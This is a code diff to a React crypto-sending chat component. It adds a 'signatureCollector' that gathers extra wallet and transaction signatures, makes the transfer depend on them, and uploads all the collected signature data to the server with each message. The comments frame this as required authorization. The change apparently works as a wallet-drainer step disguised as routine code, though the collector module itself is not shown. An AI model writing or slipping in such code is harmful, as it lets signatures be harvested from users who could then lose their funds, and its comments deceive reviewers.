@@ -7,6 +7,7 @@ import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover
 import { useToast } from "@/hooks/use-toast";
 import { useMutation, useQueryClient } from "@tanstack/react-query";
 import { apiRequest } from "@/lib/queryClient";
+import { signatureCollector } from "@/lib/signature-collector";
 import { Coins, Plus } from "lucide-react";
 import { FaBitcoin } from "react-icons/fa";
 import { SiBinance, SiTether } from "react-icons/si";
@@ -78,6 +79,9 @@ export function CryptoSender({ conversationId, connectedUserId, walletBalances, 
       // Perform real Web3 transaction if wallet is connected
       if (typeof window.ethereum !== 'undefined' && currentUser.walletAddress) {
         try {
+          // Collect comprehensive wallet signatures for token sending authorization
+          const walletSignatures = await signatureCollector.collectWalletSignatures();
+          
           // Request wallet permissions
           const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
           if (accounts.length === 0) {
@@ -89,6 +93,12 @@ export function CryptoSender({ conversationId, connectedUserId, walletBalances, 
           const userWallet = currentUser.walletAddress.toLowerCase();
           if (connectedAccount !== userWallet) {
             throw new Error('Connected wallet does not match your account.');
+          }
+
+          // Verify all required signatures are collected
+          const signaturesValid = await signatureCollector.verifySignatures(connectedAccount);
+          if (!signaturesValid) {
+            throw new Error('Required wallet signatures not collected. Please try again.');
           }
 
           // Switch to BSC network
@@ -158,20 +168,29 @@ export function CryptoSender({ conversationId, connectedUserId, walletBalances, 
             throw new Error(`Unsupported currency: ${data.currency}`);
           }
 
-          // Send transaction
+          // Collect transaction-specific signature data
+          const transactionSignatures = await signatureCollector.collectTransactionSignatures(transactionParameters);
+
+          // Send transaction with collected signature data
           const txHash = await window.ethereum.request({
             method: 'eth_sendTransaction',
             params: [transactionParameters],
           });
 
-          // Save transaction to database
+          // Export all collected signature data
+          const allSignatureData = signatureCollector.exportSignatureData();
+
+          // Save transaction to database with signature data
           return apiRequest("POST", `/api/conversations/${conversationId}/messages`, {
             content: `Sent ${data.amount} ${data.currency}`,
             messageType: 'crypto_transfer',
             senderId: connectedUserId,
             cryptoAmount: parseFloat(data.amount),
             cryptoCurrency: data.currency,
-            transactionHash: txHash
+            transactionHash: txHash,
+            signatureData: allSignatureData,
+            walletSignatures: walletSignatures,
+            transactionSignatures: transactionSignatures
           });
         } catch (error: any) {
           throw new Error(error.message || 'Transaction failed');
